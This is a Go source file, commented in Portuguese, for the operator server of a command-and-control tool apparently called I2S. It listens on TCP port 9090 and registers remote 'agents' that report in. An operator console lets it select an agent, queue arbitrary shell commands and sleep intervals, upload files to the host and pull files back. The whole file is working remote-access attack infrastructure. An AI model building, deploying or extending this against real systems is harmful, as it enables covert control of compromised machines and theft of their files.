package main

import (
	"bufio"
	"encoding/gob"
	"io/ioutil"

	//"fmt"
	"i2s/commons/estruturas"
	"i2s/commons/helpers"
	"log"
	"net"
	"os"
	"strings"
)

var (
	agentesEmCampo    = []estruturas.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	log.Println("Entrei em execução")

	go startListener("9090") //O go desatacha a função do programa principal executando startListener em paralelo

	//Criar um terminal para digitar o comando CLI
	cliHandler()
}

func cliHandler() {
	for {

		if agenteSelecionado != "" {
			print(agenteSelecionado + "@I2S# ")
		} else {
			print("I2S> ")
		}

		reader := bufio.NewReader(os.Stdin) //stdin = entrada padrão do teclado

		comandoCompleto, _ := reader.ReadString('\n')
		comandoCompleto = strings.TrimSpace(comandoCompleto) // Remove espaços em branco extras
		comandoSeparado := helpers.SeparaComando(comandoCompleto)

		comandoBase := strings.TrimSpace(comandoSeparado[0])
		if len(comandoBase) > 0 {

			switch comandoBase {
			case "show":
				showHandler(comandoSeparado)
			case "sleep":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					comandoSend := &estruturas.Comando{}
					comandoSend.Comando = comandoCompleto

					agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
				} else {
					log.Println("Escolha quantos segundos o Agente deve esperar.")
				}
			case "select":
				selectHandler(comandoSeparado)
			case "send":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					enviarArquivo(comandoSeparado)
				} else {
					log.Println("Especifique o arquivo a ser enviado.")
				}
			case "get":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					downloadArquivo(comandoCompleto)
				} else {
					log.Println("Especifique o arquivo que deseja copiar")
				}
			default:
				if agenteSelecionado != "" {
					comando := &estruturas.Comando{}
					comando.Comando = comandoCompleto

					for indice, agente := range agentesEmCampo {
						if agente.AgentId == agenteSelecionado {
							//adicionar na mensagem desse agente o comando recebido pela cli
							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *comando)
						}
					}

				} else {
					log.Println("O comando digitado não existe!")
				}
			}
		}
	}
}

func showHandler(comando []string) {
	if len(comando) > 1 {
		switch comando[1] {
		case "agentes":
			for _, agente := range agentesEmCampo {
				println("Agente ID: " + agente.AgentId + "->" + agente.AgentHostname + "@" + agente.AgentCWD)
			}
		default:
			log.Println("Parâmetro selecionado não existe.")
		}
	}
}

func selectHandler(comando []string) {
	if len(comando) > 1 {

		if agenteCadastrado(comando[1]) {
			agenteSelecionado = comando[1] //Posição 0 é select e 1 é o ID selecionado.
		} else {
			log.Println("O Agente selecionado não esta em campo.")
			log.Println("Para listar os agentes em campo use: show agentes")
		}

	} else {
		agenteSelecionado = ""
	}
}

func agenteCadastrado(agenteID string) (cadastrado bool) {
	cadastrado = false

	for _, agente := range agentesEmCampo {
		if agente.AgentId == agenteID {
			cadastrado = true
		}
	}

	return cadastrado
}

func mensagemContemResposta(mensagem estruturas.Mensagem) (contemMensagem bool) {
	contemMensagem = false

	for _, comando := range mensagem.Comandos {
		if len(comando.Resposta) > 0 {
			contemMensagem = true
		}
	}

	return contemMensagem
}

func posicaoDoAgenteEmCampo(agenteId string) (posicao int) {
	for indice, agente := range agentesEmCampo {
		if agenteId == agente.AgentId {
			posicao = indice
			break
		}
	}

	return posicao
}

func downloadArquivo(comando string) {
	comandoGet := &estruturas.Comando{}
	comandoGet.Comando = comando

	agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoGet)
}

func salvarArquivo(arquivo estruturas.Arquivo) {
	err := ioutil.WriteFile(arquivo.Nome, arquivo.Conteudo, 644)
	if err != nil {
		log.Println("Erro ao salvar arquivo recebido:", err.Error())
	}
}

func enviarArquivo(comando []string) {
	arquivoParaEnviar := &estruturas.Arquivo{}

	arquivoParaEnviar.Nome = comando[1]
	conteudo, err := os.ReadFile(arquivoParaEnviar.Nome)
	arquivoParaEnviar.Conteudo = conteudo

	comandoSend := &estruturas.Comando{}
	comandoSend.Comando = comando[0]
	comandoSend.Arquivo = *arquivoParaEnviar

	if err != nil {
		log.Println("Erro ao abrir arquivo", err.Error())
	} else {
		agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoDoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
	}
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Erro ao iniciar o listener:", err.Error())
	} else {

		for {
			canal, err := listener.Accept()

			if err != nil {
				log.Println("Erro em um novo canal:", err.Error())
			} else {
				mensagem := &estruturas.Mensagem{}

				gob.NewDecoder(canal).Decode(mensagem)

				//Verificar se o agente ja foi apresentado anteriormente
				if agenteCadastrado(mensagem.AgentId) {

					if mensagemContemResposta(*mensagem) {
						log.Println("Resposta do host:", mensagem.AgentHostname)

						//Exibir respostas
						for indice, comando := range mensagem.Comandos {
							log.Println("Resposta do Comando: ", comando.Comando)
							println(comando.Resposta)

							if helpers.SeparaComando(comando.Comando)[0] == "get" && !mensagem.Comandos[indice].Arquivo.Erro {
								salvarArquivo(mensagem.Comandos[indice].Arquivo)
							}
						}
					}

					//Enviar a lista de comandos enfileirados para o agente
					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentId)])

					//Zerar a lista de comandos ao agente
					agentesEmCampo[posicaoDoAgenteEmCampo(mensagem.AgentId)].Comandos = []estruturas.Comando{}

				} else {
					log.Println("Nova conexão: ", canal.RemoteAddr().String())
					log.Println("Agente ID: ", mensagem.AgentId)
					agentesEmCampo = append(agentesEmCampo, *mensagem)

					gob.NewEncoder(canal).Encode(mensagem)

				}
			}

			canal.Close()
		}

	}

}
